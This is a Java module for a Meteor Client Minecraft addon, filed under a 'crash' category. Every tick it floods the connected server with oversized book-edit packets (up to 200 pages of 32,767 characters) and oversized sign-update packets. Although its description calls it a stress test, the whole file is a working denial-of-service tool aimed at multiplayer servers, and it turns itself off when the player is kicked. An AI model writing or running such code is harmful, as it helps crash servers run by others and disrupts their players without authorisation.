package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.math.BlockPos;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class PayloadFlood extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> pagesPerPacket = sgGeneral.add(new IntSetting.Builder()
        .name("pages-per-packet").description("Book pages per packet.")
        .defaultValue(100).range(1, 200).sliderRange(1, 200).build()
    );
    private final Setting<Integer> pageSize = sgGeneral.add(new IntSetting.Builder()
        .name("page-size").description("Characters per book page.")
        .defaultValue(32767).range(1, 32767).sliderRange(100, 32767).build()
    );
    private final Setting<Integer> lineSize = sgGeneral.add(new IntSetting.Builder()
        .name("sign-line-size").description("Characters per sign line.")
        .defaultValue(32767).range(1, 32767).sliderRange(384, 32767).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    private boolean bookTurn = true;

    public PayloadFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "payload-flood",
            "Alternates oversized book and sign packets. Stress-tests server payload size limits.");
    }

    @Override
    public void onActivate() { bookTurn = true; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        if (bookTurn) sendBook(); else sendSign();
        bookTurn = !bookTurn;
    }

    private void sendBook() {
        String page = "A".repeat(pageSize.get());
        List<String> pages = new ArrayList<>();
        for (int i = 0; i < pagesPerPacket.get(); i++) pages.add(page);
        mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(
            mc.player.getInventory().getSelectedSlot(), pages, Optional.empty()));
    }

    private void sendSign() {
        String line = "S".repeat(lineSize.get());
        mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
            BlockPos.ORIGIN, true, line, line, line, line));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
